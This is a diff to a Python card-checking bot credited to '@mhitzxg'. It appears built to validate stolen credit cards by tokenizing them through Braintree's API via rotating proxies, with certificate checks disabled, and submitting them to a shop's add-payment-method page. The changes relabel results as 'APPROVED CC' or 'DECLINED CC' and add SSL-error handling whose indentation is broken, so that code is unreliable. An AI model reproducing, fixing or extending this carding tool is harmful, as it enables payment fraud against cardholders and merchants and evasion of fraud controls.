@@ -288,15 +288,15 @@ def check_status(result):
         # Check if the extracted reason matches approved patterns
         for pattern in approved_patterns:
             if pattern in result:
-                return "APPROVED", "Approved", True
+                return "APPROVED CC", reason_part, True
 
         # Check if the extracted reason matches CVV patterns
         for pattern in cvv_patterns:
             if pattern in reason_part:
-                return "APPROVED", reason_part, True
+                return "APPROVED CC", reason_part, True
 
         # Return the extracted reason for declined cards
-        return "DECLINED", reason_part, False
+        return "DECLINED CC", reason_part, False
 
     # If "Reason:" is not found, use the original logic
     approved_patterns = [
@@ -319,13 +319,13 @@ def check_status(result):
 
     for pattern in approved_patterns:
         if pattern in result:
-            return "APPROVED", "Approved", True
+            return "APPROVED CC", reason_part, True
 
     for pattern in cvv_patterns:
         if pattern in result:
-            return "APPROVED", reason_part, True
+            return "APPROVED CC", reason_part, True
 
-    return "DECLINED", result, False
+    return "DECLINED CC", result, False
 
 def check_card(cc_line):
     # Select new cookie pair for this card check
@@ -382,13 +382,16 @@ def check_card(cc_line):
         }
 
         proxy = get_random_proxy()
-        response = requests.post(
-            'https://payments.braintree-api.com/graphql',
-            headers=headers_token,
-            json=json_data,
-            proxies=proxy,
-            verify=False
-        )
+        try:
+         response = requests.post(
+          'https://payments.braintree-api.com/graphql',
+           headers=headers_token,
+           json=json_data,
+           proxies=proxy,
+        verify=False
+    )
+except requests.exceptions.SSLError:
+    return "❌ SSL Error: Secure connection failed. Please try again."
 
         if response.status_code != 200:
             return f"❌ Tokenization failed. Status: {response.status_code}"
@@ -408,14 +411,17 @@ def check_card(cc_line):
         }
 
         proxy = get_random_proxy()
-        response = requests.post(
-            f'{domain_url}/my-account/add-payment-method/',
-            cookies=cookies_2,  # Use fresh cookies
-            headers=headers,
-            data=data,
-            proxies=proxy,
-            verify=False
-        )
+       try:
+    response = requests.post(
+        f'{domain_url}/my-account/add-payment-method/',
+        cookies=cookies_2,
+        headers=headers,
+        data=data,
+        proxies=proxy,
+        verify=False
+    )
+except requests.exceptions.SSLError:
+    return "❌ SSL Error: Unable to reach the server securely."
 
         elapsed_time = time.time() - start_time
         soup = BeautifulSoup(response.text, 'html.parser')
@@ -671,6 +677,7 @@ Bot By: @mhitzxg
     time.sleep(2)
 
 file.close()
+
 
 
 
